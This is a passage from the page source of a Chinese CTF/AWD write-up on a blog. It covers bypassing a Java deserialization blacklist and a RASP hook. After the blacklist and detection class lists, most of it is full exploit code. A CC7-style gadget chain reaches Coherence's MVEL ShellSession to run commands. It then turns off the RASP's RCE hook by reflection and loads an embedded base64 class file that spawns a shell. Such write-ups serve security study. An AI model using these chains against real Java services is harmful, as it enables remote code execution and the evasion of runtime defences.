\"org.apache.myfaces.context.servlet.FacesContextImpl\", \"org.apache.myfaces.context.servlet.FacesContextImplBase\", \"org.apache.myfaces.el.CompositeELResolver\", \"org.apache.myfaces.el.unified.FacesELContext\", \"org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression\", \"org.apache.openjpa.ee.JNDIManagedRuntime\", \"org.apache.openjpa.ee.RegistryManagedRuntime\", \"org.apache.openjpa.ee.WASRegistryManagedRuntime\", \"org.apache.shiro.codec.Base64\", \"org.apache.shiro.codec.CodecSupport\", \"org.apache.shiro.crypto.AesCipherService\", \"org.apache.shiro.io.DefaultSerializer\", \"org.apache.shiro.jndi.JndiObjectFactory\", \"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"org.apache.shiro.util.ByteSource\", \"org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS\", \"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\", \"org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource\", \"org.apache.tomcat.dbcp.dbcp2.BasicDataSourc\", \"org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS\", \"org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource\", \"org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource\", \"org.apache.tomcat.util.buf.ByteChunk\", \"org.apache.tomcat.util.descriptor.web.FilterDef\", \"org.apache.tomcat.util.descriptor.web.FilterMap\", \"org.apache.tomcat.util.modeler.BaseModelMBean\", \"org.apache.tomcat.util.modeler.Registry\", \"org.apache.wicket.util.file.Files\", \"org.apache.wicket.util.io.DeferredFileOutputStream\", \"org.apache.wicket.util.io.ThresholdingOutputStream\", \"org.apache.wicket.util.upload.DiskFileItem\", \"org.apache.xalan.lib.sql.JNDIConnectionPool\", \"org.apache.xalan.xslt.ObjectFactory\", \"org.apache.xalan.xslt.Process\", \"org.apache.xalan.xsltc.DOM\", \"org.apache.xalan.xsltc.TransletException\", \"org.apache.xalan.xsltc.runtime.AbstractTranslet\", \"org.apache.xalan.xsltc.trax.TemplatesImpl\", \"org.apache.xalan.xsltc.trax.TransformerFactoryImpl\", \"org.apache.xbean.propertyeditor.JndiConverter\", \"org.apache.xml.dtm.DTMAxisIterator\", \"org.apache.xml.serializer.SerializationHandler\", \"org.arrah.framework.rdbms.UpdatableJdbcRowsetImpl\", \"org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap\", \"org.codehaus.groovy.runtime.ConvertedClosure\", \"org.codehaus.groovy.runtime.MethodClosure\", \"org.docx4j.org.apache.xalan.lib.sql.JNDIConnectionPool\", \"org.hibernate.EntityMode\", \"org.hibernate.engine.TypedValue\", \"org.hibernate.engine.spi.TypedValue\", \"org.hibernate.engine.spi.TypedValue$1\", \"org.hibernate.jmx.StatisticsService\", \"org.hibernate.property.BasicPropertyAccessor$BasicGetter\", \"org.hibernate.property.Getter\", \"org.hibernate.property.access.spi.Getter\", \"org.hibernate.property.access.spi.GetterMethodImpl\", \"org.hibernate.tuple.EntityModeToTuplizerMapping\", \"org.hibernate.tuple.component.AbstractComponentTuplizer\", \"org.hibernate.tuple.component.PojoComponentTuplizer\", \"org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping\", \"org.hibernate.type.AbstractType\", \"org.hibernate.type.ComponentType\", \"org.hibernate.type.Type\", \"org.jboss.interceptor.builder.InterceptionModelBuilder\", \"org.jboss.interceptor.builder.MethodReference\", \"org.jboss.interceptor.proxy.DefaultInvocationContextFactory\", \"org.jboss.interceptor.proxy.InterceptorMethodHandler\", \"org.jboss.interceptor.reader.ClassMetadataInterceptorReference\", \"org.jboss.interceptor.reader.DefaultMethodMetadata\", \"org.jboss.interceptor.reader.ReflectiveClassMetadata\", \"org.jboss.interceptor.reader.SimpleInterceptorMetadata\", \"org.jboss.interceptor.spi.context.InvocationContextFactory\", \"org.jboss.interceptor.spi.instance.InterceptorInstantiator\", \"org.jboss.interceptor.spi.metadata.ClassMetadata\", \"org.jboss.interceptor.spi.metadata.InterceptorReference\", \"org.jboss.interceptor.spi.metadata.MethodMetadata\", \"org.jboss.interceptor.spi.model.InterceptionModel\", \"org.jboss.interceptor.spi.model.InterceptionType\", \"org.jboss.remoting3.Channel\", \"org.jboss.remoting3.Connection\", \"org.jboss.remoting3.Endpoint\", \"org.jboss.remoting3.OpenListener\", \"org.jboss.remoting3.Remoting\", \"org.jboss.remoting3.remote.HttpUpgradeConnectionProviderFactory\", \"org.jboss.remoting3.spi.ConnectionHandler\", \"org.jboss.remoting3.spi.ConnectionHandlerContext\", \"org.jboss.remoting3.spi.ConnectionHandlerFactory\", \"org.jboss.util.propertyeditor.DocumentEditor\", \"org.jboss.weld.interceptor.builder.InterceptionModelBuilder\", \"org.jboss.weld.interceptor.builder.MethodReference\", \"org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory\", \"org.jboss.weld.interceptor.proxy.InterceptorMethodHandler\", \"org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference\", \"org.jboss.weld.interceptor.reader.DefaultMethodMetadata\", \"org.jboss.weld.interceptor.reader.ReflectiveClassMetadata\", \"org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata\", \"org.jboss.weld.interceptor.spi.context.InvocationContextFactory\", \"org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator\", \"org.jboss.weld.interceptor.spi.metadata.ClassMetadata\", \"org.jboss.weld.interceptor.spi.metadata.InterceptorReference\", \"org.jboss.weld.interceptor.spi.metadata.MethodMetadata\", \"org.jboss.weld.interceptor.spi.model.InterceptionModel\", \"org.jboss.weld.interceptor.spi.model.InterceptionType\", \"org.jdom.Document\", \"org.jdom.Element\", \"org.jdom.input.SAXBuilder\", \"org.jdom.transform.XSLTransformer\", \"org.jdom2.transform.XSLTransformer\", \"org.jsecurity.realm.jndi.JndiRealmFactory\", \"org.mozilla.javascript.**\", \"org.mozilla.javascript.Callable\", \"org.mozilla.javascript.ClassCache\", \"org.mozilla.javascript.Context\", \"org.mozilla.javascript.IdScriptableObject\", \"org.mozilla.javascript.MemberBox\", \"org.mozilla.javascript.NativeError\", \"org.mozilla.javascript.NativeJavaArray\", \"org.mozilla.javascript.NativeJavaMethod\", \"org.mozilla.javascript.NativeJavaObject\", \"org.mozilla.javascript.NativeObject\", \"org.mozilla.javascript.Scriptable\", \"org.mozilla.javascript.ScriptableObject\", \"org.mozilla.javascript.tools.shell.Environment\", \"org.python.core.PyBytecode\", \"org.python.core.PyFunction\", \"org.python.core.PyObject\", \"org.python.core.PyString\", \"org.python.core.PyStringMap\", \"org.quartz.utils.JNDIConnectionProvider\", \"org.reflections.Reflections\", \"org.slf4j.ext.EventData\", \"org.springframework.aop.TargetSource\", \"org.springframework.aop.config.MethodLocatingFactoryBean\", \"org.springframework.aop.framework.AdvisedSupport\", \"org.springframework.aop.framework.JdkDynamicAopProxy\", \"org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor\", \"org.springframework.aop.target.SingletonTargetSource\", \"org.springframework.beans.factory.ObjectFactory\", \"org.springframework.beans.factory.config.BeanReferenceFactoryBean\", \"org.springframework.beans.factory.config.PropertyPathFactoryBean\", \"org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler\", \"org.springframework.core.SerializableTypeWrapper.$MethodInvokeTypeProvider\", \"org.springframework.web.servlet.handler.HandlerInterceptorAdapter\", \"org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping\", \"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\", \"org.springframework.web.servlet.support.RequestContextUtils\", \"org.xnio.FutureResult\", \"org.xnio.IoFuture\", \"org.xnio.OptionMap\", \"org.xnio.Options\", \"org.xnio.Result\", \"org.xnio.Xnio\", \"org.xnio.XnioWorker\", \"org.xnio.ssl.JsseXnioSsl\"}; 10 11 public SecurityObjectInputStream(InputStream inputStream) throws IOException { 12 super(inputStream); 13 } 14 15 @Override // java.io.ObjectInputStream 16 protected Class resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException { 17 if (!contains(cls.getName())) { 18 return super.resolveClass(cls); 19 } 20 throw new InvalidClassException(\"Unexpected serialized class\", cls.getName()); 21 } 22 23 public static boolean contains(String targetValue) { 24 for (String forbiddenPackage : blacklist) { 25 if (targetValue.contains(forbiddenPackage)) { 26 return true; 27 } 28 } 29 return false; 30 } 31} Hook.json\n1\"SerialHook\": { 2 \"doSerialHook\": true, 3 \"serialClassName\": \"org/apache/shiro/io/ClassResolvingObjectInputStream\", 4 \"dangerClasses\": [ 5 \"org.springframework.transaction.support.AbstractPlatformTransactionManager\", 6 \"java.rmi.server.UnicastRemoteObject\", 7 \"java.rmi.server.RemoteObjectInvocationHandler\", 8 \"com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager\", 9 \"java.rmi.server.RemoteObject\", 10 \"com.tangosol.coherence.rest.util.extractor.MvelExtractor\", 11 \"java.lang.Runtime\", 12 \"oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor\", 13 \"org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor\", 14 \"org.eclipse.persistence.internal.descriptors.InstanceVariableAttributeAccessor\", 15 \"org.apache.commons.fileupload.disk.DiskFileItem\", 16 \"oracle.jdbc.pool.OraclePooledConnection\", 17 \"com.tangosol.util.extractor.ReflectionExtractor\", 18 \"com.tangosol.internal.util.SimpleBinaryEntry\", 19 \"com.tangosol.coherence.component.util.daemon.queueProcessor.service.grid.partitionedService.PartitionedCache$Storage$BinaryEntry\", 20 \"com.sun.rowset.JdbcRowSetImpl\", 21 \"org.eclipse.persistence.internal.indirection.ProxyIndirectionHandler\", 22 \"bsh.XThis\", 23 \"bsh.Interpreter\", 24 \"com.mchange.v2.c3p0.PoolBackedDataSource\", 25 \"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\", 26 \"org.apache.commons.beanutils.BeanComparator\", 27 \"java.lang.reflect.Proxy\", 28 \"clojure.lang.PersistentArrayMap\", 29 \"org.apache.commons.io.output.DeferredFileOutputStream\", 30 \"org.apache.commons.io.output.ThresholdingOutputStream\", 31 \"org.apache.wicket.util.upload.DiskFileItem\", 32 \"org.apache.wicket.util.io.DeferredFileOutputStream\", 33 \"org.apache.wicket.util.io.ThresholdingOutputStream\", 34 \"com.sun.org.apache.bcel.internal.util.ClassLoader\", 35 \"com.sun.syndication.feed.impl.ObjectBean\", 36 \"org.springframework.beans.factory.ObjectFactory\", 37 \"org.springframework.aop.framework.AdvisedSupport\", 38 \"org.springframework.aop.target.SingletonTargetSource\", 39 \"com.vaadin.data.util.NestedMethodProperty\", 40 \"com.vaadin.data.util.PropertysetItem\", 41 \"javax.management.BadAttributeValueExpException\", 42 \"org.apache.myfaces.context.servlet.FacesContextImpl\", 43 \"org.apache.myfaces.context.servlet.FacesContextImplBase\", 44 \"org.apache.commons.collections.functors.InvokerTransformer\", 45 \"org.apache.commons.collections.functors.InstantiateTransformer\", 46 \"org.apache.commons.collections4.functors.InvokerTransformer\", 47 \"org.apache.commons.collections4.functors.InstantiateTransformer\", 48 \"java.lang.ProcessBuilder\", 49 \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", 50 \"java.security.SignedObject\", 51 \"com.sun.jndi.ldap.LdapAttribute\", 52 \"javax.naming.InitialContext\", 53 \"org.springframework.aop.framework.JdkDynamicAopProxy\", 54 \"org.springframework.aop.aspectj\", 55 \"org.apache.xbean.naming.context\", 56 \"JSONArray\", 57 \"POJONode\", 58 \"ToStringBean\", 59 \"EqualsBean\", 60 \"ProxyLazyValue\", 61 \"SwingLazyValue\", 62 \"UIDefaults\", 63 \"XString\", 64 \"org.springframework.cache.interceptor.BeanFactoryCacheOperationSourceAdvisor\", 65 \"org.springframework.aop.aspectj.AspectInstanceFactory\", 66 \"org.slf4j\", 67 \"groovy\", 68 \"sun.print.UnixPrintService\" 69 ] 70 } Sink: ShellSession ShellSession 的主要作用是提供一个命令行环境（类似于 Bash 或 Windows 的 cmd），让用户可以输入并执行 MVEL 表达式以及预定义的一些内部命令，比如：ls、help之类的\n我们来看ShellSession的单参数String的构造方法\n这里会将参数传入exec方法，我们跟进\n这里就是将命令按行分割后写入缓冲区，接着调用_exec执行，跟进\n这里会将命令进行分割，判断第一个 token ，也就是inTokens[0]， 是否是一个预定义的内部命令。如果是内部命令，它会调用该命令对应的 execute 方法来执行，并传递后续的 tokens 作为参数，如果不是则会进入到else，并尝试作为MVEL 表达式来执行\n当执行MVEL表达式失败时（例如，对于像 ls -l 这样的非法表达式），_exec() 方法并不会立即报错，而是会启动一个智能的回退机制：如果 $COMMAND_PASSTHRU 环境变量被设为 true，它会转而将该命令视为一个操作系统的原生命令，并遍历 $PATH 环境变量中的所有目录来搜索对应的可执行文件，一旦找到，便会通过 Runtime.getRuntime().exec() 在操作系统层面启动该程序。既然都能执行mvel表达式了，感觉意义不大。可以直接利用mvel表达式命令执行。\nShellSession help = new ShellSession(\"Runtime.getRuntime().exec(\\\"calc\\\")\"); 这道题我们用ShellSession作为Sink点\nSource: Hashtable 可以看到CC7的Source Hashtable没有被waf，而且Defaultedmap也没有办，基本上可以确定cc7前半条链子都是可用的，如下\n1import com.tangosol.coherence.mvel2.sh.ShellSession; 2import org.apache.commons.collections.map.DefaultedMap; 3import org.apache.commons.collections.map.LinkedMap; 4 5import java.io.*; 6import java.util.Base64; 7import java.util.Hashtable; 8import java.util.Map; 9 10 11public class EXP { 12 public static void main(String[] args) throws IOException, ClassNotFoundException { 13// new ShellSession(\"Runtime.getRuntime().exec(\\\"calc\\\")\"); 14 LinkedMap linkedMap1 = new LinkedMap(); 15 LinkedMap linkedMap2 = new LinkedMap(); 16 Map decoratemap1 = DefaultedMap.decorate(linkedMap1, \"xrntkk1\"); 17 decoratemap1.put(\"xrntkk1\", 1); 18 Map decoratemap2 = DefaultedMap.decorate(linkedMap2, \"xrntkk2\"); 19 decoratemap2.put(\"xrntkk2\", 2); 20 Hashtable\u003cObject, Object\u003e ObjectHashtable = new Hashtable\u003c\u003e(); 21 ObjectHashtable.put(decoratemap1, \"xrntkk1\"); 22 ObjectHashtable.put(decoratemap2, \"xrntkk2\"); 23 System.out.println(linkedMap1.hashCode()); 24 System.out.println(linkedMap1.hashCode()); 25 serialize(ObjectHashtable); 26 unserialize(); 27 28 } 29 public static String serializeBase64(Object obj) throws IOException { 30 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); 31 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); 32 objectOutputStream.writeObject(obj); 33 objectOutputStream.close(); 34 35 return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); 36 } 37 public static void serialize(Object o) throws IOException { 38 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); 39 oos.writeObject(o); 40 } 41 42 public static Object unserialize() throws IOException, ClassNotFoundException { 43 SecurityObjectInputStream ois = new SecurityObjectInputStream(new FileInputStream(\"ser.bin\")); 44 Object o = ois.readObject(); 45 return o; 46 } 47 48} 实现任意transformer方法调用\n中间链子 org.apache.commons.collections4.functors.InstantiateFactory#create\nInstantiateFactory可以调用任意构造方法，而FactoryTransformer的transform方法可以调用Factory类型的create方法\n所以链子如下\n1import com.tangosol.coherence.mvel2.sh.ShellSession; 2import org.apache.commons.collections.functors.FactoryTransformer; 3import org.apache.commons.collections.functors.InstantiateFactory; 4import org.apache.commons.collections.map.DefaultedMap; 5import org.apache.commons.collections.map.LinkedMap; 6 7import java.io.*; 8import java.util.Base64; 9import java.util.Hashtable; 10import java.util.Map; 11 12 13public class EXP { 14 public static void main(String[] args) throws IOException, ClassNotFoundException { 15// new ShellSession(\"Runtime.getRuntime().exec(\\\"calc\\\")\"); 16 17 FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(ShellSession.class, new Class[]{String.class}, new Object[]{\"Runtime.getRuntime().exec(\\\"calc\\\")\"})); 18 LinkedMap linkedMap1 = new LinkedMap(); 19 LinkedMap linkedMap2 = new LinkedMap(); 20 Map decoratemap1 = DefaultedMap.decorate(linkedMap1, \"xrntkk1\"); 21 decoratemap1.put(\"xrntkk1\", 1); 22 Map decoratemap2 = DefaultedMap.decorate(linkedMap2, factoryTransformer); 23 decoratemap2.put(\"xrntkk2\", 2); 24 Hashtable\u003cObject, Object\u003e ObjectHashtable = new Hashtable\u003c\u003e(); 25 ObjectHashtable.put(decoratemap1, \"xrntkk1\"); 26 ObjectHashtable.put(decoratemap2, \"xrntkk2\"); 27 System.out.println(linkedMap1.hashCode()); 28 System.out.println(linkedMap1.hashCode()); 29 serialize(ObjectHashtable); 30 unserialize(); 31 32 33 34 } 35 public static String serializeBase64(Object obj) throws IOException { 36 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); 37 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); 38 objectOutputStream.writeObject(obj); 39 objectOutputStream.close(); 40 41 return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); 42 } 43 public static void serialize(Object o) throws IOException { 44 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); 45 oos.writeObject(o); 46 } 47 48 public static Object unserialize() throws IOException, ClassNotFoundException { 49 SecurityObjectInputStream ois = new SecurityObjectInputStream(new FileInputStream(\"ser.bin\")); 50 Object o = ois.readObject(); 51 return o; 52 } 53 54} Rasp bypass 还有最后一关，也就是rasp\n在awd-rasp里面有一个叫doRCEHook的静态变量，我们可以从线程中拿到RceHook类，并通过反射将其设置为false，当其为false的时候就不会拦截命令执行。\n1import com.tangosol.coherence.mvel2.sh.ShellSession; 2import org.apache.commons.collections.functors.FactoryTransformer; 3import org.apache.commons.collections.functors.InstantiateFactory; 4import org.apache.commons.collections.map.DefaultedMap; 5import org.apache.commons.collections.map.LinkedMap; 6 7import java.io.*; 8import java.lang.reflect.Field; 9import java.util.Base64; 10import java.util.Hashtable; 11import java.util.Map; 12import java.util.Set; 13 14 15public class EXP { 16 public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { 17// new ShellSession(\"Runtime.getRuntime().exec(\\\"calc\\\")\"); 18// Runtime.getRuntime().load(\"D:\\\\Downloads\\\\src-new\\\\awd-bypass\\\\test.dll\"); 19// ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); 20// Class\u003c?\u003e aClass = classLoader.loadClass(\"com.rasp.hooks.RceHook\"); 21// System.out.println(aClass); 22// Field[] declaredFields = aClass.getDeclaredFields(); 23// for (Field declaredField : declaredFields) { 24// System.out.println(declaredField); 25// } 26 27 FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(ShellSession.class, new Class[]{String.class}, new Object[]{\"doRCEHook=Thread.currentThread().getContextClassLoader().loadClass(\\\"com.rasp.hooks.RceHook\\\").getDeclaredField(\\\"doRCEHook\\\");doRCEHook.setAccessible(true);doRCEHook.set(null, false);Runtime.getRuntime().exec(\\\"calc\\\")\"})); 28 29 LinkedMap linkedMap1 = new LinkedMap(); 30 LinkedMap linkedMap2 = new LinkedMap(); 31 Map decoratemap1 = DefaultedMap.decorate(linkedMap1, \"xrntkk1\"); 32 decoratemap1.put(\"xrntkk1\", 1); 33 Map decoratemap2 = DefaultedMap.decorate(linkedMap2, factoryTransformer); 34 decoratemap2.put(\"xrntkk2\", 2); 35 Hashtable\u003cObject, Object\u003e ObjectHashtable = new Hashtable\u003c\u003e(); 36 ObjectHashtable.put(decoratemap1, \"xrntkk1\"); 37 ObjectHashtable.put(decoratemap2, \"xrntkk2\"); 38// System.out.println(linkedMap1.hashCode()); 39// System.out.println(linkedMap1.hashCode()); 40// serialize(ObjectHashtable); 41// unserialize(); 42 String s = serializeBase64(ObjectHashtable); 43 System.out.println(s); 44 } 45 public static String serializeBase64(Object obj) throws IOException { 46 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); 47 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); 48 objectOutputStream.writeObject(obj); 49 objectOutputStream.close(); 50 51 return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); 52 } 53 public static void serialize(Object o) throws IOException { 54 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); 55 oos.writeObject(o); 56 } 57 58 public static Object unserialize() throws IOException, ClassNotFoundException { 59 SecurityObjectInputStream ois = new SecurityObjectInputStream(new FileInputStream(\"ser.bin\")); 60 Object o = ois.readObject(); 61 return o; 62 } 63 64} 加载任意字节码\n1import com.tangosol.coherence.mvel2.sh.ShellSession; 2import org.apache.commons.collections.functors.FactoryTransformer; 3import org.apache.commons.collections.functors.InstantiateFactory; 4import org.apache.commons.collections.map.DefaultedMap; 5import org.apache.commons.collections.map.LinkedMap; 6 7import java.io.*; 8import java.lang.reflect.Field; 9import java.lang.reflect.InvocationTargetException; 10import java.lang.reflect.Method; 11import java.util.Base64; 12import java.util.Hashtable; 13import java.util.Map; 14import java.util.Set; 15 16 17public class EXP { 18 public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException { 19// new ShellSession(\"Runtime.getRuntime().exec(\\\"calc\\\")\"); 20// Runtime.getRuntime().load(\"D:\\\\Downloads\\\\src-new\\\\awd-bypass\\\\test.dll\"); 21// ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); 22// Class\u003c?\u003e aClass = classLoader.loadClass(\"com.rasp.hooks.RceHook\"); 23// System.out.println(aClass); 24// Field[] declaredFields = aClass.getDeclaredFields(); 25// for (Field declaredField : declaredFields) { 26// System.out.println(declaredField); 27// } 28 29// FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(ShellSession.class, new Class[]{String.class}, new Object[]{\"doRCEHook=Thread.currentThread().getContextClassLoader().loadClass(\\\"com.rasp.hooks.RceHook\\\").getDeclaredField(\\\"doRCEHook\\\");doRCEHook.setAccessible(true);doRCEHook.set(null, false);Runtime.getRuntime().exec(\\\"calc\\\")\"})); 30 31 FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(ShellSession.class, new Class[]{String.class}, new Object[]{\"doRCEHook=Thread.currentThread().getContextClassLoader().loadClass(\\\"com.rasp.hooks.RceHook\\\").getDeclaredField(\\\"doRCEHook\\\");doRCEHook.setAccessible(true);doRCEHook.set(null, false);bytes = java.util.Base64.getDecoder().decode(\\\"yv66vgAAADIAQAEAbm9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2Rlc2VyaWFsaXphdGlvbi9zdGQvU3RyaW5nQ29sbGVjdGlvbkRlc2VyaWFsaXplcjZmOWY0OWQ2MDM4MzQ3YmQ4MTJkY2ZkMTgwMGM4MDRlBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABGJhc2UBABJMamF2YS9sYW5nL1N0cmluZzsBAANzZXABAANjbWQBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwALDAAJAAoKAAQADQEAB29zLm5hbWUIAA8BABBqYXZhL2xhbmcvU3lzdGVtBwARAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAEwAUCgASABUBABBqYXZhL2xhbmcvU3RyaW5nBwAXAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAGQAaCgAYABsBAAN3aW4IAB0BAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAHwAgCgAYACEBAAdjbWQuZXhlCAAjDAAFAAYJAAIAJQEAAi9jCAAnDAAHAAYJAAIAKQEABy9iaW4vc2gIACsBAAItYwgALQwACAAGCQACAC8BABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHADEBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAJADMKADIANAEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAA2ADcKADIAOAEACDxjbGluaXQ+AQAEY2FsYwgAOwoAAgANAQAEQ29kZQEADVN0YWNrTWFwVGFibGUAIQACAAQAAAADAAkABQAGAAAACQAHAAYAAAAJAAgABgAAAAIAAQAJAAoAAQA+AAAAhAAEAAIAAABTKrcADhIQuAAWtgAcEh62ACKZABASJLMAJhIoswAqpwANEiyzACYSLrMAKga9ABhZA7IAJlNZBLIAKlNZBbIAMFNMuwAyWSu3ADW2ADlXpwAETLEAAQAEAE4AUQAMAAEAPwAAABcABP8AIQABBwACAAAJZQcADPwAAAcABAAIADoACgABAD4AAAAaAAIAAAAAAA4SPLMAMLsAAlm3AD1XsQAAAAAAAA==\\\");systemClassLoader = ClassLoader.getSystemClassLoader();defineClass = java.lang.Class.forName(\\\"java.lang.ClassLoader\\\").getDeclaredMethod(\\\"defineClass\\\", java.lang.Class.forName(\\\"java.lang.String\\\"), java.lang.Class.forName(\\\"[B\\\"), java.lang.Integer.TYPE, java.lang.Integer.TYPE);defineClass.setAccessible(true);defineClass.invoke(systemClassLoader, \\\"org.apache.collections.coyote.deserialization.std.StringCollectionDeserializer6f9f49d6038347bd812dcfd1800c804e\\\",bytes,0, bytes.length);systemClassLoader.loadClass(\\\"org.apache.collections.coyote.deserialization.std.StringCollectionDeserializer6f9f49d6038347bd812dcfd1800c804e\\\").newInstance();\"})); 32 33 34 LinkedMap linkedMap1 = new LinkedMap(); 35 LinkedMap linkedMap2 = new LinkedMap(); 36 Map decoratemap1 = DefaultedMap.decorate(linkedMap1, \"xrntkk1\"); 37 decoratemap1.put(\"xrntkk1\", 1); 38 Map decoratemap2 = DefaultedMap.decorate(linkedMap2, factoryTransformer); 39 decoratemap2.put(\"xrntkk2\", 2); 40 Hashtable\u003cObject, Object\u003e ObjectHashtable = new Hashtable\u003c\u003e(); 41 ObjectHashtable.put(decoratemap1, \"xrntkk1\"); 42 ObjectHashtable.put(decoratemap2, \"xrntkk2\"); 43// System.out.println(linkedMap1.hashCode()); 44// System.out.println(linkedMap1.hashCode()); 45// serialize(ObjectHashtable); 46// unserialize(); 47 String s = serializeBase64(ObjectHashtable); 48 System.out.println(s); 49 } 50 public static String serializeBase64(Object obj) throws IOException { 51 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); 52 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); 53 objectOutputStream.writeObject(obj); 54 objectOutputStream.close(); 55 56 return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); 57 } 58 public static void serialize(Object o) throws IOException { 59 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); 60 oos.writeObject(o); 61 } 62 63 public static Object unserialize() throws IOException, ClassNotFoundException { 64 SecurityObjectInputStream ois = new SecurityObjectInputStream(new FileInputStream(\"ser.bin\")); 65 Object o = ois.readObject(); 66 return o; 67 } 68 69} ",
  "wordCount" : "2984",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-12-11T11:00:00+08:00",
  "dateModified": "2025-12-11T11:00:00+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812025%E5%86%B3%E8%B5%9B/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页📔</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档🗃️</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签🔖</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索🔎</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="友链🎈">
                    <span>友链🎈</span>
                </a>
            </li>
            <li>
